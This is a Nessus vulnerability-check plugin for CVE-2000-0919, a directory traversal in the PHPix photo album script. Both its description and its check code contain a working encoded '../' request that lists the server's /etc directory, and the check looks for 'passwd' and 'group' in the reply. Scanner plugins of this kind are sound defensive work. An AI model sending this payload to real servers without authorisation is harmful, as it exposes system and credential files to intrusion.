#
# This script was written by Zorgon <zorgon@linuxstart.com>
#
# See the Nessus Scripts License for details
#


include("compat.inc");

if(description)
{
 script_id(10574);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2000-0919");
 script_bugtraq_id(1773);
 script_xref(name:"OSVDB", value:"472");
 
 script_name(english:"PHPix album Parameter Encoded Traversal Arbitrary File/Directory Access");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files can be read on the remote host." );
 script_set_attribute(attribute:"description", value:
"The PHPix program allows an attacker to read arbitrary files on the 
remote web server,  prefixing the pathname of the file with ..%2F..%2F..

For example:

    GET /Album/?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0

will return all the files that are nested within /etc directory." );
 script_set_attribute(attribute:"solution", value:
"Contact your vendor for the latest software release." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 
 script_summary(english:"PHPix directory traversal vulnerability");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2000-2009 Zorgon <zorgon@linuxstart.com>");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
  buf = http_get(item:string("/Album/?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0"), port:port);
  rep = http_keepalive_send_recv(port:port, data:buf);
  if("Prev 20" >< rep)
  	{
	if(("group" >< rep) && ("passwd" >< rep))
         	security_warning(port);
	}
}
